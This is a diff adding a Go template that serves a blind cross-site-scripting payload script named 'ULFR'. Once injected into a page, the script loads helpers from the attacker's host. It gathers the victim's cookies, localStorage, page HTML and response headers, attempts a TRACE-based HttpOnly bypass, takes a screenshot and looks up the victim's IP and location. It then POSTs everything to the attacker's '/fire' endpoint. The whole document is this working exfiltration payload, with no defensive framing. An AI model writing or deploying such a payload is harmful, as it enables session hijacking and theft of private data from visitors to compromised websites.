@@ -1,0 +1,141 @@
+{{ define "content" }}
+async function ULFR(){
+    let allHeaders;
+    let imageDataUrl;
+    let traceMethod;
+    let cookies;
+    let url = "http://{{ .Host }}/fire"
+
+    await (async () => {
+        const response = await fetch("http://{{ .Host }}/assets/ulfr/ulfr-helpers.v1.0.0-orj.js");
+        const UlfrHelpers = await response.text();
+
+        const UlfrHelpersElement = document.createElement('script');
+        UlfrHelpersElement.innerHTML = UlfrHelpers;
+        document.head.appendChild(UlfrHelpersElement);
+
+        allHeaders = Header2JSON(GetAllHeaders("HEAD"))
+        traceMethod = Header2JSON(GetAllHeaders("TRACE"))
+        cookies = Cookies2JSON(GetCokies())
+    })();
+
+    await (async () => {
+        const response = await fetch("http://{{ .Host }}/assets/ulfr/html2canvas.js");
+        const html2canvas = await response.text();
+    
+        const html2canvasElement = document.createElement('script');
+        html2canvasElement.innerHTML = html2canvas;
+        document.head.appendChild(html2canvasElement);
+    
+        imageDataUrl = await ImageCapture();
+    })();
+
+    var formData = new FormData();
+    formData.append("BrowserInformations", JSON.stringify(BrowserInformations()));
+    formData.append("UserInformations", JSON.stringify({
+        "IP": GetIP(),
+        "Location": GetLocation()
+    }));
+    formData.append("Cookies", JSON.stringify({
+        "TraceMethod": traceMethod,
+        "HttpOnlyBypass": {},
+        "Cookies": cookies
+    }));
+    formData.append("SiteInformations", JSON.stringify({
+        "Headers": allHeaders,   
+    }));
+    formData.append("HTML", GetHTML());
+    formData.append("ScreenShot", imageDataUrl);
+    formData.append("host", "{{ .Host }}");
+    formData.append("path", "{{ .Path }}");
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
+    xhr.send(formData);
+
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 300) {
+            console.log('Success:', xhr.responseText);
+        } else {
+            console.error('Hata:', xhr.statusText);
+        }
+    };
+    
+    xhr.onerror = function () {
+        console.error('Error.');
+    };
+}
+
+async function ImageCapture() {
+    const canvas = await html2canvas(document.body);
+    return canvas.toDataURL('image/png');
+}
+
+function GetAllHeaders(method){
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, window.location.href, false);
+        xhr.send();
+
+        return xhr;
+    } catch (error) {
+        return xhr;
+    }
+}
+
+function GetCokies() {
+    return document.cookie;
+}
+
+function GetHTML() {
+    return document.body.innerHTML;
+}
+
+function LocalStorageData () {
+    var localStorageContent = {};
+
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        var value = localStorage.getItem(key);
+    
+        try {
+            value = JSON.parse(value);
+        } catch (e) {
+            // err
+        }
+    
+        localStorageContent[key] = value;
+    }
+    return localStorageContent;
+}
+
+function BrowserInformations() {
+    return {
+        "browserName": navigator.appName,
+        "browserUserAgent": navigator.userAgent,
+        "defaultLanguage": navigator.language,
+        "screenSize": screen.width + "x" + screen.height,
+        "availableScreenSize": screen.availWidth + "x" + screen.availHeight,
+        "localStorageData": LocalStorageData(),
+        // "sessionStorageData": JSON.parse(JSON.stringify(sessionStorage)),
+        "fullURL": window.location.href,
+        "referer": document.referrer
+    }
+}
+
+function GetIP() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://api.ipify.org/?format=json", false);
+    xhr.send();
+    return JSON.parse(xhr.responseText).ip;
+}
+
+function GetLocation() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://ipapi.co/json/", false);
+    xhr.send();
+    return JSON.parse(xhr.responseText);
+}
+
+ULFR()
+{{ end }}
